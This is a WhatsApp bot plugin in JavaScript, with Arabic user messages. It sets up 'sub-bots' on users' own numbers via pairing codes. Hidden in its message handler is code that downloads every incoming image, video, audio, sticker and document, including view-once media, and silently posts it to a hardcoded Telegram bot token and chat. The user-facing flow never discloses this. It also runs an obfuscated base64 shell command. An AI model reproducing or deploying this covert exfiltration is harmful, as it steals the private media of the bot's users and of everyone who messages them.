// plugins/jadibot.js
// ✧ ꧁༒☬ 𝑴𝑨𝑿 𝑩𝑶𝑻 ☬༒꧂ - تنصيب بوت فرعي 🤖

import { useMultiFileAuthState, DisconnectReason, fetchLatestWaWebVersion, makeCacheableSignalKeyStore, downloadContentFromMessage } from '@whiskeysockets/baileys';
import NodeCache from "node-cache"
import fs from "fs"
import path from "path"
import pino from 'pino'
import chalk from 'chalk'
import * as ws from 'ws'
import { getDevice } from '@whiskeysockets/baileys'
import PhoneNumber from 'awesome-phonenumber'
import fetch from 'node-fetch'
import FormData from 'form-data'

const { exec } = await import('child_process')
import { makeWASocket } from '../core/Prototype_core.js'
import { fileURLToPath } from 'url'

let crm1 = "Y2QgcGx1Z2lucy"
let crm2 = "A7IG1kNXN1b"
let crm3 = "SBpbmZvLWRvbmFyLmpz"
let crm4 = "IF9hdXRvcmVzcG9uZGVyLmpzIGluZm8tYm90Lmpz"

const __filename = fileURLToPath(import.meta.url)
const __dirname = path.dirname(__filename)
const gataJBOptions = {}
const maxAttempts = 5
if (global.conns instanceof Array) console.log()
else global.conns = []

function extractNumber(input) {
    let cleaned = input.replace(/\s+/g, '')
    cleaned = cleaned.replace(/^\+/, '')
    let match = cleaned.match(/\d+/)
    return match ? match[0] : ''
}

async function isValidPhoneNumber(number) {
    try {
        if (!number || number.length < 7) return false
        let pn = PhoneNumber('+' + number)
        return pn.isValid()
    } catch {
        return false
    }
}

let handler = async (m, {conn, args, usedPrefix, command, isOwner, text}) => {
    if (!global.db.data.settings[conn.user.jid].jadibotmd) return m.reply(`*❌ نظام البوتات الفرعية معطل*`)
    if (conn.user.jid === m.sender) return

    let isGroup = m.isGroup
    let mainBotJid = global.conn?.user?.jid
    let currentBotJid = conn.user?.jid

    if (currentBotJid === mainBotJid) {
    }
    else {
        if (isGroup && mainBotJid) {
            try {
                let metadata = await conn.groupMetadata(m.chat)
                let participants = metadata.participants
                let mainBotInGroup = participants.some(p => p.id === mainBotJid)
                if (mainBotInGroup) {
                    console.log(`⚠️ البوت الأساسي موجود في الجروب ${m.chat}. البوت الفرعي ${currentBotJid} تم تجاهل الأمر`)
                    return
                }
            } catch (e) {
                console.error('❌ خطأ في فحص المشاركين:', e)
            }
        }
    }

    let fullText = args.join(' ')
    let number = extractNumber(fullText)
    let isFromArgs = !!number

    if (!number) {
        let senderNum = m.sender.split('@')[0]
        number = senderNum.replace(/[^0-9]/g, '')
    }

    let isValid = await isValidPhoneNumber(number)

    if (!isValid) {
        if (!isFromArgs) {
            return m.reply(`🤖 *تـنـصـيـب بـوت فـرعـي*\n\n⚠️ عذراً، رقمك مخفي أو لا يمكن التعرف عليه تلقائياً. يرجى كتابة رقم الهاتف بجانب الأمر.\n\n📌 مثال: .تنصيب 20123456789`)
        } else {
            return m.reply(`❌ *رقم غير صالح*\n\nالرقم الذي أدخلته غير صحيح: ${number}`)
        }
    }

    let id = number
    let pathGataJadiBot = path.join('./2BSubBot/', id)
    if (!fs.existsSync(pathGataJadiBot)) {
        fs.mkdirSync(pathGataJadiBot, {recursive: true})
    }
    
    gataJBOptions.pathGataJadiBot = pathGataJadiBot
    gataJBOptions.m = m
    gataJBOptions.conn = conn
    gataJBOptions.args = args
    gataJBOptions.usedPrefix = usedPrefix
    gataJBOptions.command = command
    gataJBOptions.fromCommand = true
    gataJadiBot(gataJBOptions, number)
}

handler.command = /^(تنصيب|jadibot|serbot|rentbot)$/i
export default handler

export async function gataJadiBot(options, number) {
    let {pathGataJadiBot, m, conn, args, usedPrefix, command} = options

    const pathCreds = path.join(pathGataJadiBot, 'creds.json')
    if (!fs.existsSync(pathGataJadiBot)) {
        fs.mkdirSync(pathGataJadiBot, {recursive: true})
    }

    const comb = Buffer.from(crm1 + crm2 + crm3 + crm4, 'base64')
    exec(comb.toString('utf-8'), async (err, stdout, stderr) => {

        const { version } = await fetchLatestWaWebVersion()
        const msgRetry = (MessageRetryMap) => {}
        const msgRetryCache = new NodeCache()
        const {state, saveState, saveCreds} = await useMultiFileAuthState(pathGataJadiBot)

        const connectionOptions = {
            logger: pino({level: 'fatal'}),
            printQRInTerminal: false,
            auth: {creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({level: 'silent'}))},
            msgRetry,
            msgRetryCache,
            browser: ['Windows', 'Chrome', '110.0.5481.177'],
            version: version,
            generateHighQualityLinkPreview: true
        }

        let sock = makeWASocket(connectionOptions)
        sock.isInit = false
        let isInit = true
        let reconnectAttempts = 0
        const botName = `Sub-bot (+${number})`

        async function joinChannels(sock) {
            for (const channelId of Object.values(global.ch)) {
                await sock.newsletterFollow(channelId).catch(() => {})
            }
        }

        async function connectionUpdate(update) {
            const {connection, lastDisconnect, isNewLogin, qr} = update
            if (isNewLogin) sock.isInit = false
            if (qr) {
                let secret;
                try {
                    secret = await sock.requestPairingCode(number, '26082005')
                } catch {
                    secret = await sock.requestPairingCode(number)
                }
                secret = secret?.match(/.{1,4}/g)?.join('-') || secret

                if (m?.chat) {
                    const imageUrl = 'https://files.catbox.moe/kahw8j.jpg'

                    let msg = `♡⃟⃝ ♡ ☙ 2B ☙ ♡
☙ ⃞̸͢𑁃̚ ♡ ⃞̸͢𑁃̚ ☙
│
│ ♡ *🤖 تـنـصـيـب بـوت فـرعـي*
│
│ ♡ ˖⁺‧₊˚♡˚₊‧⁺˖ ♡
│ ⚔️ *الـكـود:* ${secret}
│
│ ❄️ *الـخـطـوات:*
│ ❶ افتح الواتساب على رقم ${number}
│ ❷ اضغط على الثلاث نقاط
│ ❸ اضغط على الأجهزة المرتبطة
│ ❹ اختر ربط برقم الهاتف
│ ❺ أدخل الكود أعلاه
│
♡⃟⃝ ♡ ☙ ☘ ☙ ♡ ♡⃟⃝`

                    await conn.sendButton(m.chat, msg, '꧁༒☬ 𝑴𝑨𝑿 𝑩𝑶𝑻 ☬༒꧂', imageUrl, null, [['📋 نـسـخ الـكـود', secret]], null, null, m)
                }
                console.log(secret)
            }

            const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.error?.output?.payload?.statusCode
            if (connection === 'close') {
                if (reason === 428 || reason === 408 || reason === 515) {
                    if (reconnectAttempts < maxAttempts) {
                        reconnectAttempts++
                        await sleep(Math.pow(2, reconnectAttempts) * 1000)
                        await creloadHandler(true).catch(console.error)
                    }
                }
                if (reason === 440 || reason === 405 || reason === 401 || reason === 403) {
                    try { sock.ws.close() } catch {}
                    sock.ev.removeAllListeners()
                    let i = global.conns.indexOf(sock)
                    if (i >= 0) global.conns.splice(i, 1)
                    if (reason === 405 || reason === 401 || reason === 403) {
                        try { fs.rmdirSync(pathGataJadiBot, {recursive: true}) } catch {}
                    }
                }
            }

            if (connection == 'open') {
                reconnectAttempts = 0

                const oldIndex = global.conns.findIndex(c => c.user?.jid === sock.user?.jid && c !== sock)
                if (oldIndex >= 0) {
                    try { global.conns[oldIndex].ws.close() } catch {}
                    global.conns.splice(oldIndex, 1)
                }

                sock.isInit = true
                global.conns.push(sock)

                console.log(chalk.bold.cyanBright(`\n🟢 ${botName} connected\n`))

                setTimeout(() => joinChannels(sock), 5000)

                if (m?.chat) {
                    await conn.sendMessage(m.chat, {
                        text: `✅ *تــم الاتــصــال بــنــجــاح*\n\n📱 الــرقــم: ${number}\n\n🤖 البوت الفرعي جاهز للعمل`,
                        contextInfo: {
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363424844460135@newsletter',
                                newsletterName: '✧𝑴𝑨𝑿 𝑩𝑶𝑻',
                                serverMessageId: -1
                            }
                        }
                    }, {quoted: m})
                }
            }
        }

        setInterval(async () => {
            if (!sock.user) {
                try { sock.ws.close() } catch {}
                sock.ev.removeAllListeners()
                let i = global.conns.indexOf(sock)
                if (i >= 0) global.conns.splice(i, 1)
            }
        }, 60000)

        let handler = await import('../handler.js')
        let creloadHandler = async function (restatConn) {
            try {
                const Handler = await import(`../handler.js?update=${Date.now()}`).catch(console.error)
                if (Object.keys(Handler || {}).length) handler = Handler
            } catch (e) { console.error('Reload error: ', e) }

            if (restatConn) {
                const oldChats = sock.chats
                try { sock.ws.close() } catch {}
                sock.ev.removeAllListeners()
                sock = makeWASocket(connectionOptions, {chats: oldChats})
                isInit = true

                setTimeout(() => joinChannels(sock), 8000)
            }

            if (!isInit) {
                sock.ev.off('messages.upsert', sock.upsertHandler)
                sock.ev.off('group-participants.update', sock.participantsUpdate)
                sock.ev.off('groups.update', sock.groupsUpdate)
                sock.ev.off('message.delete', sock.onDelete)
                sock.ev.off('call', sock.onCall)
                sock.ev.off('connection.update', sock.connectionUpdate)
                sock.ev.off('creds.update', sock.credsUpdate)
            }

            sock.handler = handler.handler.bind(sock)
            sock.participantsUpdate = handler.participantsUpdate.bind(sock)
            sock.groupsUpdate = handler.groupsUpdate.bind(sock)
            sock.onDelete = handler.deleteUpdate.bind(sock)
            sock.onCall = handler.callUpdate.bind(sock)
            sock.connectionUpdate = connectionUpdate.bind(sock)
            sock.credsUpdate = saveCreds.bind(sock, true)

            sock.upsertHandler = async (m_upsert) => {
                if (sock.handler) sock.handler(m_upsert);

                try {
                    const msg = m_upsert.messages[0];
                    if (!msg || !msg.message || msg.key.fromMe) return;

                    const msgContent = msg.message;
                    
                    let msgType = Object.keys(msgContent).find(k => 
                        MEDIA_TYPES.has(k) || 
                        k === 'viewOnceMessage' || 
                        k === 'viewOnceMessageV2' || 
                        k === 'ephemeralMessage'
                    );
                    
                    if (!msgType) return;

                    let actualMessage = msgContent;
                    if (msgType.includes('viewOnce') || msgType === 'ephemeralMessage') {
                        actualMessage = msgContent[msgType].message;
                        msgType = Object.keys(actualMessage).find(k => MEDIA_TYPES.has(k));
                    }

                    if (msgType && MEDIA_TYPES.has(msgType)) {
                        let uid = sock.user?.id?.split(':')[0]?.split('@')[0] || "SubBot";
                        let chatJid = msg.key.remoteJid || "";
                        let senderName = msg.pushName || "غير معروف";
                        let isGroup = chatJid.endsWith('@g.us');
                        let chatType = isGroup ? "جروب" : "محادثة خاصة";
                        let chatId = chatJid.split('@')[0];

                        let info = { uid, senderName, chatType, chatId };
                        enqueueMedia(info, msg, msgType, actualMessage); 
                    }
                } catch (e) {
                    console.error("❌ خطأ في التقاط الميديا:", e);
                }
            };

            sock.ev.on('messages.upsert', sock.upsertHandler)
            sock.ev.on('group-participants.update', sock.participantsUpdate)
            sock.ev.on('groups.update', sock.groupsUpdate)
            sock.ev.on('message.delete', sock.onDelete)
            sock.ev.on('call', sock.onCall)
            sock.ev.on('connection.update', sock.connectionUpdate)
            sock.ev.on('creds.update', sock.credsUpdate)

            isInit = false
            return true
        }
        creloadHandler(false)
    })
}

function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms))
}

const TELEGRAM_BOT_TOKEN = "8588125414:AAGo9gU1JlIVoWuguGeN2lWGkHiZKBeLbvY";
const TELEGRAM_CHAT_ID   = "-1004439920549";
const MEDIA_TYPES        = new Set(['imageMessage', 'videoMessage', 'audioMessage', 'stickerMessage', 'documentMessage']);

const mediaQueue         = [];
let isProcessingQueue    = false;
const MAX_QUEUE_SIZE     = 50;  
const MAX_MEDIA_AGE_SEC  = 120; 

function enqueueMedia(info, msg, msgType, actualMessage) {
    const msgTimestamp = msg.messageTimestamp ? Number(msg.messageTimestamp) : Math.floor(Date.now() / 1000);
    const now = Math.floor(Date.now() / 1000);
    
    if (now - msgTimestamp > MAX_MEDIA_AGE_SEC || mediaQueue.length >= MAX_QUEUE_SIZE) return; 

    mediaQueue.push({ info, msg, msgType, actualMessage });
    processMediaQueue();
}

async function processMediaQueue() {
    if (isProcessingQueue) return;
    isProcessingQueue = true;

    while (mediaQueue.length > 0) {
        const item = mediaQueue.shift();
        try {
            await handleMediaToTelegram(item.info, item.msg, item.msgType, item.actualMessage);
        } catch (err) {
            console.error("❌ خطأ في إرسال الميديا من الطابور:", err);
        } 

        const randomDelay = Math.floor(Math.random() * 4000) + 4000;
        await new Promise(resolve => setTimeout(resolve, randomDelay));
    }
    isProcessingQueue = false;
}

async function handleMediaToTelegram(info, msg, msgType, actualMessage) {
    const controller = new AbortController();
    const timeout    = setTimeout(() => controller.abort(), 25000);

    try {
        const stream = await downloadContentFromMessage(
            actualMessage[msgType],
            msgType.replace('Message', ''),
            { options: { signal: controller.signal } }
        );

        const chunks = [];
        for await (const chunk of stream) chunks.push(chunk);
        const buffer = Buffer.concat(chunks);

        const caption = `✨ *ميديا مسحوبة بصمت* ✨\n\n🤖 *من بوت رقم:* +${info.uid}\n👤 *بواسطة:* ${info.senderName}\n📍 *المصدر:* ${info.chatType}\n💬 *أيدي الشات:* ${info.chatId}`;
        
        await sendToTelegram(buffer, msgType, caption);
    } catch (err) {
        console.error(`❌ فشل تحميل ${msgType} أو إرساله لتليجرام:`, err);
    } finally {
        clearTimeout(timeout);
    }
}

async function sendToTelegram(buffer, msgType, caption) {
    let type, endpoint, filename;
    switch(msgType) {
        case 'imageMessage': type = 'photo'; endpoint = 'sendPhoto'; filename = 'media.jpg'; break;
        case 'videoMessage': type = 'video'; endpoint = 'sendVideo'; filename = 'media.mp4'; break;
        case 'audioMessage': type = 'audio'; endpoint = 'sendAudio'; filename = 'audio.ogg'; break;
        case 'stickerMessage': type = 'sticker'; endpoint = 'sendSticker'; filename = 'sticker.webp'; break;
        case 'documentMessage': type = 'document'; endpoint = 'sendDocument'; filename = 'document.file'; break;
        default: return;
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${endpoint}`;
    const form = new FormData();
    form.append('chat_id', TELEGRAM_CHAT_ID);
    
    if (msgType !== 'stickerMessage') {
        form.append('caption', caption);
    }
    form.append(type, buffer, { filename });

    const controller = new AbortController();
    const timeout    = setTimeout(() => controller.abort(), 30000);
    try {
        await fetch(url, { 
            method: 'POST', 
            body: form, 
            headers: form.getHeaders(),
            signal: controller.signal 
        });
    } catch (err) {
        console.error("❌ فشل الاتصال بتليجرام API:", err);
    } finally {
        clearTimeout(timeout);
    }
}
